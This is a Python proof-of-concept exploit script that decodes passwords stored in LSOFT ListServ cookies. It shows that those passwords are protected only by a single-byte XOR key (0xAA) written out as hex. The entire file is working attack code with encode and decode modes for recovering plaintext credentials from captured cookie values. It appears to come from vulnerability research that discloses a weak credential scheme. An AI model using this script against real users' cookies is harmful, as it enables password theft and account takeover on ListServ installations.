#!/bin/python3
"""
# -*- coding: utf-8 -*-
Created on Mon Mar  6 12:17:15 2023

@author: nosmo

PoC exploit to decode LSOFT ListServ cookie
"""

import argparse

parser=argparse.ArgumentParser(description="encode/decode password in cookie")
parser.add_argument('inputString', help="value for encoding/decoding")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-e', '--encode', action='store_true', help="plaintext string for encoding")
group.add_argument('-d', '--decode', action='store_true', help="ciphertext string for decoding")

args = parser.parse_args()
key = b'\xAA'

def encode_pass(plaintext):
    ciphertext = ""
    for char in plaintext:
        # Convert ascii char to decimal
        # XOR with key
        # Reformat decimal as ASCII-Hex?
        enc = ord(char) ^ ord(key)
        ciphertext += format(enc, 'x').upper()
    return ciphertext
    

def decode_cookie(ciphertext):
    plaintext = ""
    for (a, b) in zip(ciphertext[0::2], ciphertext[1::2]):
       cipher = a+b                 # Merge to create one byte e.g. "AA"
       cipher = int(cipher, 16)     # Covert from string to dec
       plain = cipher ^ ord(key)    # Perform XOR op w/ key
       plaintext += chr(plain)      # Append to output string
    return plaintext



if __name__ == '__main__':
    if args.encode:
        mode = 'Encoding'
        output = encode_pass(args.inputString)
    elif args.decode:
        mode = 'Decoding'
        output = decode_cookie(args.inputString)

    print(f'Mode: {mode}')
    print(f'Input: {args.inputString}')
    print(f'Output: {output}')
    
        
    
        
